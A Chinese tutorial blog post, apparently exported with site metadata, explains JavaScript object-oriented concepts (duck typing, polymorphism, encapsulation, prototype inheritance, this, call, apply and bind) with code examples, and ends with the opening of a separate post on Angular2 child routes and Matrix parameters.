静态类型语言的优点首先是在编译时就能发现类型不匹配的错误，编辑器可以帮助提前避免程序在运行期间有可能发生的一些错误。其次，如果在程序中明确地规定了数据类型，编译器还可以针对这些信息对程序进行一些优化工作，提高程序执行速度。静态类型语言的缺点首先是迫使程序员依照强契约来编写程序，为每个变量规定数据类型，归根结底只是辅助编写可靠性高程序的一种手段，而不是编写程序的目的。其次，类型的声明也会增加更多的代码，在程序编写过程中，这些细节会让程序员的精力从思考业务逻辑上分散开来。 动态类型语言的优点是编写的代码数量更少，看起来也更加简洁，程序员可以把精力更多地放在业务逻辑上面。虽然不区分类型在某些情况下会让程序变得难以理解，但整体而言，代码量越少，越专注于逻辑表达，对阅读程序是越有帮助的。动态类型语言的缺点是无法保证变量的类型，从而在程序的运行期有可能发生跟类型相关的错误。 动态类型语言对变量类型的宽容给实际编码带来了很大的灵活性。由于无需进行类型检测，可以尝试调用任何对象的任意方法，而无需去考虑它原本是否被设计为拥有该方法。这一切都建立在鸭子类型（ducktyping）的概念上，鸭子类型的通俗说法是：“如果它走起路来像鸭子，叫起来也是鸭子，那么它就是鸭子。”鸭子类型指导只关注对象的行为，而不关注对象本身，也就是关注HAS-A,而不是IS-A。 在动态类型语言的面向对象设计中，鸭子类型的概念至关重要。利用鸭子类型的思想，不必借助超类型的帮助，就能轻松地在动态类型语言中实现一个原则：“面向接口编程，而不是面向实现编程”。例如，一个对象若有push和pop方法，并且这些方法提供了正确的实现，它就可以被当作栈来使用。一个对象如果有length属性，也可以依照下标来存取属性（最好还要拥有slice和splice等方法），这个对象就可以被当作数组来使用。 在静态类型语言中，要实现“面向接口编程”并不是一件容易的事情，往往要通过抽象类或者接口等将对象进行向上转型。当对象的真正类型被隐藏在它的超类型身后，这些对象才能在类型检查系统的“监视”之下互相被替换使用。只有当对象能够被互相替换使用，才能体现出对象多态性的价值。 “面向接口编程”是设计模式中最重要的思想。 多态“多态”一词源于希腊文polymorphism，拆开来看是poly（复数）+morph（形态）+ism，从字面上可以理解为复数形态。多态的实际含义是：同一操作作用于不同的对象上面，可以产生不同的解释和不同的执行结果。换句话说，给不同的对象发送同一个消息的时候，这些对象会根据这个消息分别给出不同的反馈。 多态背后的思想是将“做什么”和“谁去做以及怎样去做”分离开来，也就是将“不变的事物”与“可能改变的事物”分离开来。动物都会叫，这是不变的，但是不同类型的动物具体怎么叫是可变的。把不变的部分隔离出来，把可变的部分封装起来，这给予了扩展程序的能力，程序看起来是可生长的，也是符合开放—封闭原则的，相对于修改代码来说，仅仅增加代码就能完成同样的功能，这显然优雅和安全得多。 多态的思想实际上是把“做什么”和“谁去做”分离开来，要实现这一点，归根结底先要消除类型之间的耦合关系。如果类型之间的耦合关系没有被消除，那么在方法中指定了被执行对象是某个类型，它就不可能再被替换为另外一个类型。在Java中，可以通过向上转型来实现多态。 而JavaScript的变量类型在运行期是可变的，这意味着JavaScript对象的多态性是与生俱来的。动态类型语言，它在编译时没有类型检查的过程，既没有检查创建的对象类型，又没有检查传递的参数类型。不存在任何程度上的“类型耦合”。这正是从上一节的鸭子类型中领悟的道理。在JavaScript中，并不需要诸如向上转型之类的技术来取得多态的效果。 在《重构：改善既有代码的设计》里写到：多态的最根本好处在于，你不必再向对象询问“你是什么类型”而后根据得到的答案调用对象的某个行为——你只管调用该行为就是了，其他的一切多态机制都会为你安排妥当。换句话说，多态最根本的作用就是通过把过程化的条件分支语句转化为对象的多态性，从而消除这些条件分支语句。 利用对象的多态性，每个对象应该做什么，已经成为了该对象的一个方法，被安装在对象的内部，每个对象负责它们自己的行为。所以这些对象可以根据同一个消息，有条不紊地分别进行各自的工作。将行为分布在各个对象中，并让这些对象各自负责自己的行为，这正是面向对象设计的优点。 拿命令模式来说，请求被封装在一些命令对象中，这使得命令的调用者和命令的接收者可以完全解耦开来，当调用命令的execute方法时，不同的命令会做不同的事情，从而会产生不同的执行结果。而做这些事情的过程是早已被封装在命令对象内部的，作为调用命令的客户，根本不必去关心命令执行的具体过程。 在组合模式中，多态性使得客户可以完全忽略组合对象和叶节点对象之前的区别，这正是组合模式最大的作用所在。对组合对象和叶节点对象发出同一个消息的时候，它们会各自做自己应该做的事情，组合对象把消息继续转发给下面的叶节点对象，叶节点对象则会对这些消息作出真实的反馈。 在策略模式中，Context并没有执行算法的能力，而是把这个职责委托给了某个策略对象。每个策略对象负责的算法已被各自封装在对象内部。当对这些策略对象发出“计算”的消息时，它们会返回各自不同的计算结果。 在JavaScript这种将函数作为一等对象的语言中，函数本身也是对象，函数用来封装行为并且能够被四处传递。当对一些函数发出“调用”的消息时，这些函数会返回不同的执行结果，这是“多态性”的一种体现，也是很多设计模式在JavaScript中可以用高阶函数来代替实现的原因。 封装封装的目的是将信息隐藏。一般而言，讨论的封装是封装数据和封装实现。更广义的封装，不仅包括封装数据和封装实现，还包括封装类型和封装变化。 在许多语言的对象系统中，封装数据是由语法解析来实现的，这些语言也许提供了private、public、protected等关键字来提供不同的访问权限。但JavaScript并没有提供对这些关键字的支持，只能依赖变量的作用域来实现封装特性，而且只能模拟出public和private这两种封装性。除了ECMAScript6中提供的let之外，一般通过函数来创建作用域：12345678var myObject = (function()&#123; var __name = 'sven'; // 私 有（ private） 变 量 return &#123; getName: function()&#123; // 公 开（ public） 方 法 return __name; &#125; &#125; &#125;)(); console.log( myObject.getName() ); // 输 出： sven console.log( myObject.__name ) // 输 出： undefined 在ECAMScript6中，还可以通过Symbol创建私有属性。 封装的目的是将信息隐藏，封装应该被视为“任何形式的封装”，也就是说，封装不仅仅是隐藏数据，还包括隐藏实现细节、设计细节以及隐藏对象的类型等。 从封装实现细节来讲，封装使得对象内部的变化对其他对象而言是透明的，也就是不可见的。对象对它自己的行为负责。其他对象或者用户都不关心它的内部实现。封装使得对象之间的耦合变松散，对象之间只通过暴露的API接口来通信。当修改一个对象时，可以随意地修改它的内部实现，只要对外的接口没有变化，就不会影响到程序的其他功能。 封装实现细节的例子非常之多。拿迭代器来说明，迭代器的作用是在不暴露一个聚合对象的内部表示的前提下，提供一种方式来顺序访问这个聚合对象。编写了一个each函数，它的作用就是遍历一个聚合对象，使用这个each函数的人不用关心它的内部是怎样实现的，只要它提供的功能正确便可以。即使each函数修改了内部源代码，只要对外的接口或者调用方式没有变化，用户就不用关心它内部实现的改变。 封装类型是静态类型语言中一种重要的封装方式。一般而言，封装类型是通过抽象类和接口来进行的。把对象的真正类型隐藏在抽象类或者接口之后，相比对象的类型，客户更关心对象的行为。在许多静态语言的设计模式中，想方设法地去隐藏对象的类型，也是促使这些模式诞生的原因之一。比如工厂方法模式、组合模式等。 在JavaScript中，并没有对抽象类和接口的支持。JavaScript本身也是一门类型模糊的语言。在封装类型方面，JavaScript没有能力，也没有必要做得更多。对于JavaScript的设计模式实现来说，不区分类型是一种失色，也可以说是一种解脱。 从设计模式的角度出发，封装在更重要的层面体现为封装变化。《设计模式》提到的“找到变化并封装之”。《设计模式》一书中共归纳总结了23种设计模式。从意图上区分，这23种设计模式分别被划分为创建型模式、结构型模式和行为型模式。 拿创建型模式来说，要创建一个对象，是一种抽象行为，而具体创建什么对象则是可以变化的，创建型模式的目的就是封装创建对象的变化。而结构型模式封装的是对象之间的组合关系。行为型模式封装的是对象的行为变化。通过封装变化的方式，把系统中稳定不变的部分和容易变化的部分隔离开来，在系统的演变过程中，只需要替换那些容易变化的部分，如果这些部分是已经封装好的，替换起来也相对容易。这可以最大程度地保证程序的稳定性和可扩展性。 原型模式和基于原型继承的JavaScript对象系统在以类为中心的面向对象编程语言中，类和对象的关系可以想象成铸模和铸件的关系，对象总是从类中创建而来。而在原型编程的思想中，类并不是必需的，对象未必需要从类中创建而来，一个对象是通过克隆另外一个对象所得到的。 原型模式不单是一种设计模式，也被称为一种编程泛型。 从设计模式的角度讲，原型模式是用于创建对象的一种模式，如果想要创建一个对象，一种方法是先指定它的类型，然后通过类来创建这个对象。原型模式选择了另外一种方式，不再关心对象的具体类型，而是找到一个对象，然后通过克隆来创建一个一模一样的对象。既然原型模式是通过克隆来创建对象的，那么很自然地会想到，如果需要一个跟某个对象一模一样的对象，就可以使用原型模式。 原型模式的实现关键，是语言本身是否提供了clone方法。ECMAScript5提供了Object.create方法，可以用来克隆对象。12345678910111213141516171819var Plane = function()&#123; this.blood = 100; this.attackLevel = 1; this.defenseLevel = 1; &#125;; var plane = new Plane(); plane.blood = 500; plane.attackLevel = 10; plane.defenseLevel = 7; var clonePlane = Object.create( plane ); console.log( clonePlane ); // 输 出： Object &#123;blood: 500, attackLevel: 10, defenseLevel: 7&#125;// 在不支持Object.create方法的浏览器中，则可以使用以下代码：Object.create = Object.create | | function( obj )&#123; var F = function()&#123;&#125;; F.prototype = obj; return new F(); &#125; 克隆是创建对象的手段，原型模式的真正目的并非在于需要得到一个一模一样的对象，而是提供了一种便捷的方式去创建某个类型的对象，克隆只是创建这个对象的过程和手段。 在用Java等静态类型语言编写程序的时候，类型之间的解耦非常重要。依赖倒置原则提醒创建对象的时候要避免依赖具体类型，而用newXXX创建对象的方式显得很僵硬。工厂方法模式和抽象工厂模式可以帮助解决这个问题，但这两个模式会带来许多跟产品类平行的工厂类层次，也会增加很多额外的代码。 原型模式提供了另外一种创建对象的方式，通过克隆对象，就不用再关心对象的具体类型名字。在JavaScript这种类型模糊的语言中，创建对象非常容易，也不存在类型耦合的问题。从设计模式的角度来讲，原型模式的意义并不算大。但JavaScript本身是一门基于原型的面向对象语言，它的对象系统就是使用原型模式来搭建的，在这里称之为原型编程范型也许更合适。 原型编程范型至少包括以下基本规则: 所有的数据都是对象。 要得到一个对象，不是通过实例化类，而是找到一个对象作为原型并克隆它。 对象会记住它的原型。 如果对象无法响应某个请求，它会把这个请求委托给它自己的原型。 JavaScript在设计的时候，模仿Java引入了两套类型机制：基本类型和对象类型。基本类型包括undefined、number、boolean、string、function、object。按照JavaScript设计者的本意，除了undefined之外，一切都应是对象。为了实现这一目标，number、boolean、string这几种基本类型数据也可以通过“包装类”的方式变成对象类型数据来处理。 JavaScript中的根对象是Object.prototype对象。Object.prototype对象是一个空的对象。在JavaScript遇到的每个对象，实际上都是从Object.prototype对象克隆而来的，Object.prototype对象就是它们的原型。 在JavaScript语言里，并不需要关心克隆的细节，因为这是引擎内部负责实现的。所需要做的只是显式地调用varobj1=newObject()或者varobj2={}。此时，引擎内部会从Object.prototype上面克隆一个对象出来，最终得到的就是这个对象。JavaScript的函数既可以作为普通函数被调用，也可以作为构造器被调用。当使用new运算符来调用函数时，此时的函数就是一个构造器。用new运算符来创建对象的过程，实际上也只是先克隆Object.prototype对象，再进行一些其他额外操作的过程。具体细节可以参阅《JavaScript语言精髓与编程实践》。 在Chrome和Firefox等向外暴露了对象__proto__属性的浏览器下，可以通过下面这段代码来理解new运算的过程：12345678910111213141516function Person( name )&#123; this.name = name; &#125;; Person.prototype.getName = function()&#123; return this.name; &#125;; var objectFactory = function()&#123; var obj = new Object(), // 从 Object.prototype 上 克 隆 一 个 空 的 对 象 Constructor = [].shift.call( arguments ); // 取 得 外 部 传 入 的 构 造 器， 此 例 是 Person obj.__proto__ = Constructor.prototype; // 指 向 正 确 的 原 型 var ret = Constructor.apply( obj, arguments ); // 借 用 外 部 传 入 的 构 造 器 给 obj 设 置 属 性 return typeof ret === 'object' ? ret : obj; // 确 保 构 造 器 总 是 会 返 回 一 个 对 象 &#125;; var a = objectFactory( Person, 'sven' ); console.log( a.name ); // 输 出： sven console.log( a.getName() ); // 输 出： sven 如果请求可以在一个链条中依次往后传递，那么每个节点都必须知道它的下一个节点。同理，要完成JavaScript语言中的原型链查找机制，每个对象至少应该先记住它自己的原型。“对象的原型”，就JavaScript的真正实现来说，其实并不能说对象有原型，而只能说对象的构造器有原型。对于“对象把请求委托给它自己的原型”这句话，更好的说法是对象把请求委托给它的构造器的原型。那么对象如何把请求顺利地转交给它的构造器的原型呢？JavaScript给对象提供了一个名为__proto__的隐藏属性，某个对象的__proto__属性默认会指向它的构造器的原型对象，即{Constructor}.prototype。 实际上，__proto__就是对象跟“对象构造器的原型”联系起来的纽带。正因为对象要通过__proto__属性来记住它的构造器的原型，所以用objectFactory函数来模拟用new创建对象时，需要手动给obj对象设置正确的__proto__指向。obj.__proto__=Constructor.prototype;让obj.__proto__指向Person.prototype，而不是原来的Object.prototype。 在JavaScript中，每个对象都是从Object.prototype对象克隆而来的，如果是这样的话，只能得到单一的继承关系，即每个对象都继承自Object.prototype对象，这样的对象系统显然是非常受限的。实际上，虽然JavaScript的对象最初都是由Object.prototype对象克隆而来的，但对象构造器的原型并不仅限于Object.prototype上，而是可以动态指向其他对象。这样一来，当对象a需要借用对象b的能力时，可以有选择性地把对象a的构造器的原型指向对象b，从而达到继承的效果。下面的代码是最常用的原型继承方式：12345var obj = &#123; name: 'sven' &#125;;var A = function()&#123;&#125;; A.prototype = obj; var a = new A(); console.log( a.name ); // 输 出： sven 来看看执行这段代码的时候，引擎做了哪些事情。 首先，尝试遍历对象a中的所有属性，但没有找到name这个属性。 查找name属性的这个请求被委托给对象a的构造器的原型，它被a.__proto__记录着并且指向A.prototype，而A.prototype被设置为对象obj。 在对象obj中找到了name属性，并返回它的值。 当期望得到一个“类”继承自另外一个“类”的效果时，往往会用下面的代码来模拟实现：12345678var A = function()&#123;&#125;; A.prototype = &#123; name: 'sven' &#125;; var B = function()&#123;&#125;;B.prototype = new A();var b = new B(); console.log( b.name ); // 输 出： sven 再看这段代码执行的时候，引擎做了什么事情。首先，尝试遍历对象b中的所有属性，但没有找到name这个属性。查找name属性的请求被委托给对象b的构造器的原型，它被b.__proto__记录着并且指向B.prototype，而B.prototype被设置为一个通过newA()创建出来的对象。在该对象中依然没有找到name属性，于是请求被继续委托给这个对象构造器的原型A.prototype。在A.prototype中找到了name属性，并返回它的值。 和把B.prototype直接指向一个字面量对象相比，通过B.prototype=newA()形成的原型链比之前多了一层。但二者之间没有本质上的区别，都是将对象构造器的原型指向另外一个对象，继承总是发生在对象和对象之间。 Object.create就是原型模式的天然实现。使用Object.create来完成原型继承看起来更能体现原型模式的精髓。目前大多数主流浏览器都提供了Object.create方法。但美中不足是在当前的JavaScript引擎下，通过Object.create来创建对象的效率并不高，通常比通过构造函数创建对象要慢。此外还有一些值得注意的地方，比如通过设置构造器的prototype来实现原型继承的时候，除了根对象Object.prototype本身之外，任何对象都会有一个原型。而通过Object.create(null)可以创建出没有原型的对象。 另外，ECMAScript6带来了新的Class语法。这让JavaScript看起来像是一门基于类的语言，但其背后仍是通过原型机制来创建对象。通过Class创建对象的一段简单示例代码如下所示：1234567891011121314151617181920class Animal&#123; constructor(name)&#123; this.name = name; &#125; getName()&#123; return this.name; &#125;&#125;class Dog extends Animal&#123; constructor(name)&#123; super(name); &#125; speak()&#123; return 'woo'; &#125;&#125;var dog = new Dog('foo');console.log(dog.getName() + ' ' + dog.speak()); this、call和apply在JavaScript编程中，this关键字总是让人感到迷惑，Function.prototype.call和Function.prototype.apply这两个方法也有着广泛的运用。 this跟别的语言大相径庭的是，JavaScript的this总是指向一个对象，而具体指向哪个对象是在运行时基于函数的执行环境动态绑定的，而非函数被声明时的环境。 this的指向除去不常用的with和eval的情况，具体到实际应用中，this的指向大致可以分为以下4种。 作为对象的方法调用。 作为普通函数调用。 构造器调用。 Function.prototype.call或Function.prototype.apply调用。 1. 作为对象的方法调用当函数作为对象的方法被调用时，this指向该对象：1234567var obj = &#123; a: 1, getA: function()&#123; alert ( this === obj ); // 输 出： true alert ( this.a ); // 输 出: 1 &#125; &#125;; obj.getA(); 2. 作为普通函数调用当函数不作为对象的属性被调用时，也就是常说的普通函数方式，此时的this总是指向全局对象。在浏览器的JavaScript里，这个全局对象是window对象。12345678910111213141516window.name = 'globalName';var getName = function() &#123; return this.name; &#125;;console.log(getName()); // 输 出： globalName// 或window.name = 'globalName';var myObject = &#123; name: 'sven', getName: function() &#123; return this.name; &#125;&#125;;var getName = myObject.getName;console.log(getName()); // globalName 有时候会遇到一些困扰，比如在div节点的事件函数内部，有一个局部的callback方法，callback被作为普通函数调用时，callback内部的this指向了window，但往往是想让它指向该div节点，见如下代码：12345678window.id = 'window';document.getElementById('div1').onclick = function() &#123; alert(this.id); // 输 出：' div1' var callback = function() &#123; alert(this.id); // 输 出：' window' &#125; callback();&#125;; 此时有一种简单的解决方案，可以用一个变量保存div节点的引用：12345678window.id = 'window';document.getElementById('div1').onclick = function() &#123; var that = this; // 保存div引用 var callback = function() &#123; alert(that.id); // 输 出：' window' &#125; callback();&#125;; 在ECMAScript5的strict模式下，这种情况下的this已经被规定为不会指向全局对象，而是undefined：12345function func()&#123; \"use strict\" alert ( this ); // 输 出： undefined &#125; func(); 3. 构造器调用JavaScript中没有类，但是可以从构造器中创建对象，同时也提供了new运算符，使得构造器看起来更像一个类。 除了宿主提供的一些内置函数，大部分JavaScript函数都可以当作构造器使用。构造器的外表跟普通函数一模一样，它们的区别在于被调用的方式。当用new运算符调用函数时，该函数总会返回一个对象，通常情况下，构造器里的this就指向返回的这个对象，见如下代码：1234var MyClass = function()&#123; this.name = 'sven'; &#125;; var obj = new MyClass(); alert ( obj.name ); // 输 出： sven 但用new调用构造器时，还要注意一个问题，如果构造器显式地返回了一个object类型的对象，那么此次运算结果最终会返回这个对象，而不是之前期待的this：12345678var MyClass = function() &#123; this.name = 'sven'; return &#123; // 显 式 地 返 回 一 个 对 象 name: 'anne' &#125; &#125;;var obj = new MyClass();alert(obj.name); // 输 出： anne 如果构造器不显式地返回任何数据，或者是返回一个非对象类型的数据，就不会造成上述问题：123456var MyClass = function() &#123; this.name = 'sven' return 'anne'; // 返 回 string 类 型 &#125;;var obj = new MyClass();alert(obj.name); // 输 出： sven 4. Function.prototype.call或Function.prototype.apply调用跟普通的函数调用相比，用Function.prototype.call或Function.prototype.apply可以动态地改变传入函数的this：1234567891011var obj1 = &#123; name: 'sven', getName: function() &#123; return this.name; &#125;&#125;;var obj2 = &#123; name: 'anne'&#125;;console.log(obj1.getName()); // 输 出: sven console.log(obj1.getName.call(obj2)); // 输 出： anne call和apply方法能很好地体现JavaScript的函数式语言特性，在JavaScript中，几乎每一次编写函数式语言风格的代码，都离不开call和apply。在JavaScript诸多版本的设计模式中，也用到了call和apply 丢失的this这是一个经常遇到的问题，先看下面的代码：123456789var obj = &#123; myName: 'sven', getName: function() &#123; return this.myName; &#125;&#125;;console.log(obj.getName()); // 输 出：' sven' var getName2 = obj.getName;console.log(getName2()); // 输 出： undefined 当调用obj.getName时，getName方法是作为obj对象的属性被调用的，此时的this指向obj对象，所以obj.getName()输出’sven’。 当用另外一个变量getName2来引用obj.getName，并且调用getName2时，此时是普通函数调用方式，this是指向全局window的，所以程序的执行结果是undefined。 再看另一个例子，document.getElementById这个方法名实在有点过长，大概尝试过用一个短的函数来代替它，如同prototype.js等一些框架所做过的事情：12var getId = function( id )&#123; return document.getElementById( id ); &#125;; getId( 'div1' ); 也许思考过为什么不能用下面这种更简单的方式：12var getId = document.getElementById; getId( 'div1' ); 在Chrome、Firefox、IE10中执行过后就会发现，这段代码抛出了一个异常。这是因为许多引擎的document.getElementById方法的内部实现中需要用到this。这个this本来被期望指向document，当getElementById方法作为document对象的属性被调用时，方法内部的this确实是指向document的。 但当用getId来引用document.getElementById之后，再调用getId，此时就成了普通函数调用，函数内部的this指向了window，而不是原来的document。可以尝试利用apply把document当作this传入getId函数，帮助“修正”this：12345678document.getElementById = (function(func) &#123; return function() &#123; return func.apply(document, arguments); &#125;&#125;)(document.getElementById);var getId = document.getElementById;var div = getId('div1');alert(div.id); // 输 出： div1 call和applyECAMScript3给Function的原型定义了两个方法，它们是Function.prototype.call和Function.prototype.apply。在实际开发中，特别是在一些函数式风格的代码编写中，call和apply方法尤为有用。在JavaScript版本的设计模式中，这两个方法的应用也非常广泛，能熟练运用这两个方法，是真正成为一名JavaScript程序员的重要一步。 call和apply的区别Function.prototype.call和Function.prototype.apply都是非常常用的方法。它们的作用一模一样，区别仅在于传入参数形式的不同。 apply接受两个参数，第一个参数指定了函数体内this对象的指向，第二个参数为一个带下标的集合，这个集合可以为数组，也可以为类数组，apply方法把这个集合中的元素作为参数传递给被调用的函数：1234var func = function(a, b, c) &#123; alert([a, b, c]); // 输 出 [ 1, 2, 3 ] &#125;;func.apply(null, [1, 2, 3]); 在这段代码中，参数1、2、3被放在数组中一起传入func函数，它们分别对应func参数列表中的a、b、c。call传入的参数数量不固定，跟apply相同的是，第一个参数也是代表函数体内的this指向，从第二个参数开始往后，每个参数被依次传入函数：1234var func = function(a, b, c) &#123; alert([a, b, c]); // 输 出 [ 1, 2, 3 ] &#125;;func.call(null, 1, 2, 3); 当调用一个函数时，JavaScript的解释器并不会计较形参和实参在数量、类型以及顺序上的区别，JavaScript的参数在内部就是用一个数组来表示的。从这个意义上说，apply比call的使用率更高，不必关心具体有多少参数被传入函数，只要用apply一股脑地推过去就可以了。 call是包装在apply上面的一颗语法糖，如果明确地知道函数接受多少个参数，而且想一目了然地表达形参和实参的对应关系，那么也可以用call来传送参数。 当使用call或者apply的时候，如果传入的第一个参数为null，函数体内的this会指向默认的宿主对象，在浏览器中则是window：1234var func = function(a, b, c) &#123; alert(this === window); // 输 出 true &#125;;func.apply(null, [1, 2, 3]); 但如果是在严格模式下，函数体内的this还是为null： 有时候使用call或者apply的目的不在于指定this指向，而是另有用途，比如借用其他对象的方法。那么可以传入null来代替某个具体的对象：1Math.max.apply( null, [ 1, 2, 5, 3, 4 ] ) // 输 出： 5 call和apply的用途在实际开发中的用途 1.改变this指向call和apply最常见的用途是改变函数内部的this指向，来看个例子：12345678910111213var obj1 = &#123; name: 'sven'&#125;;var obj2 = &#123; name: 'anne'&#125;;window.name = 'window';var getName = function() &#123; alert(this.name); &#125;;getName(); // 输 出: window getName.call(obj1); // 输 出: sven getName.call(obj2); // 输 出: anne 当执行getName.call(obj1)这句代码时，getName函数体内的this就指向obj1对象，所以此处的1var getName = function()&#123; alert ( this.name ); &#125;; 实际上相当于：1var getName = function()&#123; alert ( obj1. name );&#125;; 在实际开发中，经常会遇到this指向被不经意改变的场景，比如有一个div节点，div节点的onclick事件中的this本来是指向这个div的：123document.getElementById('div1').onclick = function() &#123; alert(this.id); // 输 出： div1 &#125;; 假如该事件函数中有一个内部函数func，在事件内部调用func函数时，func函数体内的this就指向了window，而不是预期的div，见如下代码：1234567document.getElementById('div1').onclick = function() &#123; alert(this.id); // 输 出： div1 var func = function() &#123; alert(this.id); // 输 出： undefined &#125; func();&#125;; 这时候用call来修正func函数内的this，使其依然指向div：123456document.getElementById('div1').onclick = function() &#123; var func = function() &#123; alert(this.id); // 输 出： div1 &#125; func.call(this);&#125;; 使用call来修正this的场景，比如修正document.getElementById函数内部“丢失”的this，代码如下：12345678document.getElementById = (function(func) &#123; return function() &#123; return func.apply(document, arguments); &#125;&#125;)(document.getElementById);var getId = document.getElementById;var div = getId('div1');alert(div.id); // 输 出： div1 2. Function.prototype.bind大部分高级浏览器都实现了内置的Function.prototype.bind，用来指定函数内部的this指向，即使没有原生的Function.prototype.bind实现，来模拟一个也不是难事，代码如下：12345678910111213Function.prototype.bind = function(context) &#123; var self = this; // 保 存 原 函 数 return function() &#123; // 返 回 一 个 新 的 函 数 return self.apply(context, arguments); // 执 行 新 的 函 数 的 时 候， 会 把 之 前 传 入 的 context 当 作 新 函 数 体 内 的 this &#125;&#125;;var obj = &#123; name: 'sven'&#125;;var func = function() &#123; alert(this.name); // 输 出： sven &#125;.bind(obj);func(); 通过Function.prototype.bind来“包装”func函数，并且传入一个对象context当作参数，这个context对象就是想修正的this对象。 在Function.prototype.bind的内部实现中，先把func函数的引用保存起来，然后返回一个新的函数。当在将来执行func函数时，实际上先执行的是这个刚刚返回的新函数。在新函数内部，self.apply(context,arguments)这句代码才是执行原来的func函数，并且指定context对象为func函数体内的this。 这是一个简化版的Function.prototype.bind实现，通常还会把它实现得稍微复杂一点，使得可以往func函数中预先填入一些参数：1234567891011121314151617181920Function.prototype.bind = function() &#123; var self = this, // 保 存 原 函 数 context = [].shift.call(arguments), // 需 要 绑 定 的 this 上 下 文 args = [].slice.call(arguments); // 剩 余 的 参 数 转 成 数 组 return function() &#123; // 返 回 一 个 新 的 函 数 // 执 行 新 的 函 数 的 时 候， 会 把 之 前 传 入 的 context 当 作 新 函 数 体 内 的 this // 并 且 组 合 两 次 分 别 传 入 的 参 数， 作 为 新 函 数 的 参 数 return self.apply(context, [].concat.call(args, [].slice.call(arguments))); &#125;&#125;;var obj = &#123; name: 'sven'&#125;;var func = function(a, b, c, d) &#123; alert(this.name); // 输 出： sven alert([a, b, c, d]) // 输 出：[ 1, 2, 3, 4 ] &#125;.bind(obj, 1, 2);func(3, 4); 3. 借用其他对象的方法借用方法的第一种场景是“借用构造函数”，可以实现一些类似继承的效果：1234567891011var A = function(name) &#123; this.name = name; &#125;;var B = function() &#123; A.apply(this, arguments); &#125;;B.prototype.getName = function() &#123; return this.name;&#125;;var b = new B('sven');console.log(b.getName()); // 输 出： 'sven' 第二种运用场景，函数的参数列表arguments是一个类数组对象，虽然它也有“下标”，但它并非真正的数组，所以也不能像数组一样，进行排序操作或者往集合里添加一个新的元素。这种情况下，常常会借用Array.prototype对象上的方法。 比如想往arguments中添加一个新的元素，通常会借用Array.prototype.push：1234(function() &#123; Array.prototype.push.call(arguments, 3); console.log(arguments); // 输 出[ 1,2,3] &#125;)(1, 2); 在操作arguments的时候，经常非常频繁地找Array.prototype对象借用方法。 想把arguments转成真正的数组的时候，可以借用Array.prototype.slice方法；想截去arguments列表中的头一个元素时，又可以借用Array.prototype.shift方法。 这种机制的内部实现原理是什么呢？V8的引擎源码，以Array.prototype.push为例：123456789function ArrayPush() &#123; var n = TO_UINT32(this.length); // 被 push 的 对 象 的 length var m = % _ArgumentsLength(); // push 的 参 数 个 数 for (var i = 0; i &lt; m; i++) &#123; this[i + n] = % _Arguments(i); // 复 制 元 素 (1) &#125; this.length = n + m; // 修 正 length 属 性 的 值 (2) return this.length;&#125;; 通过这段代码可以看到，Array.prototype.push实际上是一个属性复制的过程，把参数按照下标依次添加到被push的对象上面，顺便修改了这个对象的length属性。至于被修改的对象是谁，到底是数组还是类数组对象，这一点并不重要。 由此可以推断，可以把“任意”对象传入Array.prototype.push：1234var a = &#123;&#125;;Array.prototype.push.call(a, 'first');alert(a.length); // 输 出： 1 alert(a[0]); // first 这段代码在绝大部分浏览器里都能顺利执行，但由于引擎的内部实现存在差异，如果在低版本的IE浏览器中执行，必须显式地给对象a设置length属性：1var a = &#123; length: 0 &#125;; 前面之所以把“任意”两字加了双引号，是因为可以借用Array.prototype.push方法的对象还要满足以下两个条件，从ArrayPush函数的(1)处和(2)处也可以猜到，这个对象至少还要满足： 对象本身要可以存取属性； 对象的length属性可读写。 对于第一个条件，对象本身存取属性并没有问题，但如果借用Array.prototype.push方法的不是一个object类型的数据，而是一个number类型的数据呢?无法在number身上存取其他数据，那么从下面的测试代码可以发现，一个number类型的数据不可能借用到Array.prototype.push方法：1234var a = 1;Array.prototype.push.call(a, 'first');alert(a.length); // 输 出： undefinedalert(a[0]); // 输 出： undefined 对于第二个条件，函数的length属性就是一个只读的属性，表示形参的个数，尝试把一个函数当作this传入Array.prototype.push：123var func = function() &#123;&#125;;Array.prototype.push.call(func, 'first');alert(func.length); // 报 错： cannot assign to read only property ‘length’ of function()&#123;&#125;","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"Angular2入门-路由-2","slug":"angular13","date":"2017-10-20T11:05:01.000Z","updated":"2017-12-06T14:50:08.821Z","comments":true,"path":"2017/10/20/angular13/","link":"","permalink":"https://github.com/xmoyKING/2017/10/20/angular13/","excerpt":"","text":"子路由和附属Outlet子路由一个组件可以被嵌入到另一个组件中，从而建立组件之前的多级嵌套关系。与此类似，Angular也允许一个路由组件被嵌入到另一个路由组件中，从而建立路由的多级嵌套关系。 比如通讯录例子中的DetailComponent组件本身是一个路由组件，在其中可以显示关于个人信息的AnnotationComponent组件和相册AlbumComponent组件，同时也作为一个子路由组件被嵌入到根路由组件ContactApp之中。 这种嵌套关系通过路由配置来建立，其中children是专门服务于子路由组件DetailComponent的路由配置，其所包含的每一个配置项的path值都相对于该子路由组件的path值：1234567891011// app.routes.tsexport const rooRouterConfig: Routes = [ &#123; path: 'detail/:id', component: DetailComponent, children: [ &#123; path: '', component: AnnotationComponent&#125;, // `http://localhost:3000/detail/:id` &#123; path: 'album', component: AlbumComponent&#125; // `http://localhost:3000/detail/:id/album` ] &#125;]; 浏览器中输入http://localhost:3000/detail/1/album，可以看到DetailComponent组件和AlbumComponent组件的内容都在联系人详情也上显示。12345678&lt;!-- detail.component.html --&gt;&lt;detail&gt; &lt;!-- .... --&gt; &lt;router-outlet&gt; &lt;/router-outlet&gt; &lt;album&gt; &lt;!-- .... --&gt; &lt;/album&gt; &lt;detail&gt; Matrix参数假设需要实现一个功能，要求AlbumComponent组件能根据搜索条件来显示照片，这就需要将搜索条件作为参数传递给AlbumComponent组件。Path参数无法满足这个功能，因为Path参数是确定的且必须为每一个参数赋值才能匹配到配置项，而搜索条件是不确定。虽然Query参数可以用来传递不确定的参数，但缺点在于Query参数是一个公共区域，页面上所有组件都可以访问。 1http://localhost:3000/detail/1/album?after=2015-01-01&amp;before=2015-12-31 